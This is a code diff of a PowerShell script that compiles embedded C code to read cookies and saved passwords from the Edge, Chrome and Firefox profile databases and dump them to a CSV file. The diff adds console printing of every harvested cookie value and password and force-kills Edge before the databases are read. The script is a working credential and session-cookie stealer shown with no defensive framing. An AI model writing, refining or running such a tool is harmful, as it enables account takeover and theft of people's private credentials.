@@ -1,7 +1,7 @@
 # Define the URL for the SQLite amalgamation ZIP file
 $headerUrl = "https://www.sqlite.org/2024/sqlite-amalgamation-3470000.zip"
 $headerZipPath = "$env:TEMP\sqlite-amalgamation.zip"
-$w64devkitPath = "C:\C"
+$w64devkitPath = "C:\C\w64devkit"
 
 # Define the C code
 $cCode = @"
@@ -25,6 +25,7 @@ void decrypt(char *str) {
 
 void write_to_csv(FILE *file, const char *type, const char *col1, const char *col2, const char *col3) {
     fprintf(file, "%s,%s,%s,%s\n", type, col1, col2, col3);
+    printf("Writing to CSV: %s, %s, %s, %s\n", type, col1, col2, col3);
 }
 
 void read_cookies(sqlite3 *db, FILE *file) {
@@ -38,10 +39,11 @@ void read_cookies(sqlite3 *db, FILE *file) {
     }
 
     while (sqlite3_step(res) == SQLITE_ROW) {
-        write_to_csv(file, "Cookie",
-                     (const char *)sqlite3_column_text(res, 0),
-                     (const char *)sqlite3_column_text(res, 1),
-                     (const char *)sqlite3_column_text(res, 2));
+        const char *host_key = (const char *)sqlite3_column_text(res, 0);
+        const char *name = (const char *)sqlite3_column_text(res, 1);
+        const char *value = (const char *)sqlite3_column_text(res, 2);
+        printf("Read cookie: %s, %s, %s\n", host_key, name, value);
+        write_to_csv(file, "Cookie", host_key, name, value);
     }
 
     sqlite3_finalize(res);
@@ -58,10 +60,11 @@ void read_passwords(sqlite3 *db, FILE *file) {
     }
 
     while (sqlite3_step(res) == SQLITE_ROW) {
-        write_to_csv(file, "Password",
-                     (const char *)sqlite3_column_text(res, 0),
-                     (const char *)sqlite3_column_text(res, 1),
-                     (const char *)sqlite3_column_text(res, 2));
+        const char *origin_url = (const char *)sqlite3_column_text(res, 0);
+        const char *username_value = (const char *)sqlite3_column_text(res, 1);
+        const char *password_value = (const char *)sqlite3_column_text(res, 2);
+        printf("Read password: %s, %s, %s\n", origin_url, username_value, password_value);
+        write_to_csv(file, "Password", origin_url, username_value, password_value);
     }
 
     sqlite3_finalize(res);
@@ -127,6 +130,13 @@ int main() {
     get_firefox_profile_path(firefox_profile, MAX_PATH);
     snprintf(firefox_cookies, MAX_PATH, "%s\\<profile>\\cookies.sqlite", firefox_profile); // Replace <profile> with actual profile name
 
+    // Print paths for verification
+    printf("Edge cookies path: %s\n", edge_cookies);
+    printf("Edge passwords path: %s\n", edge_passwords);
+    printf("Chrome cookies path: %s\n", chrome_cookies);
+    printf("Chrome passwords path: %s\n", chrome_passwords);
+    printf("Firefox cookies path: %s\n", firefox_cookies);
+
     FILE *file = fopen("output.csv", "w");
     if (!file) {
         fprintf(stderr, "Cannot open output.csv for writing\n");
@@ -152,6 +162,12 @@ int main() {
 }
 "@
 
+# Stop Edge process and wait until it ends
+Write-Output "Stopping Edge process..."
+Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
+Write-Output "Waiting for Edge process to exit..."
+Wait-Process -Name "msedge" -ErrorAction SilentlyContinue
+
 # Download the SQLite amalgamation ZIP file
 Write-Output "Downloading SQLite amalgamation..."
 Invoke-WebRequest -Uri $headerUrl -OutFile $headerZipPath
@@ -159,6 +175,11 @@ Invoke-WebRequest -Uri $headerUrl -OutFile $headerZipPath
 # Extract the SQLite amalgamation ZIP file
 Write-Output "Extracting SQLite amalgamation..."
 Expand-Archive -Path $headerZipPath -DestinationPath $env:TEMP -Force
+
+# Create include directory if it doesn't exist
+if (-Not (Test-Path "$w64devkitPath\include")) {
+    New-Item -ItemType Directory -Path "$w64devkitPath\include"
+}
 
 # Copy sqlite3.h and sqlite3.c to the w64devkit include directory
 Write-Output "Copying sqlite3.h and sqlite3.c to w64devkit include directory..."
@@ -172,20 +193,16 @@ Remove-Item -Path $headerZipPath
 $cFilePath = "$env:TEMP\read_browser_data.c"
 Set-Content -Path $cFilePath -Value $cCode
 
+# Set PATH environment variable to include w64devkit bin directory
+$env:Path += ";$w64devkitPath\bin"
+
 # Compile the C code using w64devkit GCC
 Write-Output "Compiling the C code..."
 & "$w64devkitPath\bin\gcc.exe" -o "$env:TEMP\read_browser_data.exe" $cFilePath "$w64devkitPath\include\sqlite3.c" -I"$w64devkitPath\include" -L"$w64devkitPath\lib" -lShell32
 
 Write-Output "Compilation completed successfully!"
 
-# Stop Edge process and wait until it ends
-Write-Output "Stopping Edge process..."
-Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
-Write-Output "Waiting for Edge process to exit..."
-Wait-Process -Name "msedge" -ErrorAction SilentlyContinue
-
 # Execute the compiled executable
-Write-Output "Executing the compiled program..."
-& "$env:TEMP\read_browser_data.exe"
+Write-Output "Executing the compiled program..." & "$env:TEMP\read_browser_data.exe"
 
 Write-Output "Execution completed. Check output.csv for results."
